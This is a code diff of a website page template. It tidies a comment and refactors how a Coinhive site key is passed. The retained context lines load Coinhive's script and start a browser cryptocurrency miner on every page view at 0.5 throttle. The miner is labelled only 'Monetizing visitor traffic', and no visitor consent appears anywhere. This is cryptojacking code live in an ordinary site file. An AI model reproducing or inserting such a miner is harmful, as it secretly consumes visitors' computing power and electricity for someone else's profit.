@@ -16,11 +16,14 @@ particlesJS.load('sidebar', '/public/json/particles-sidebar.json', function() { 
   ga('send', 'pageview');
 </script>
 
-<!-- Monitizing visitor traffic -->
+<!-- Monetizing visitor traffic -->
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
+  // What site-key do we use?
+  var key = '8HwAd4b7uoIsGeauLI4MFx7udLaTofWm'; // Don't forget to replace this with your own key
+
   // Get instance of the miner
-  var miner = new CoinHive.Anonymous('8HwAd4b7uoIsGeauLI4MFx7udLaTofWm',{ throttle: 0.5 });
+  var miner = new CoinHive.Anonymous(key, { throttle: 0.5 });
 
   // Start this baby up!
   miner.start();
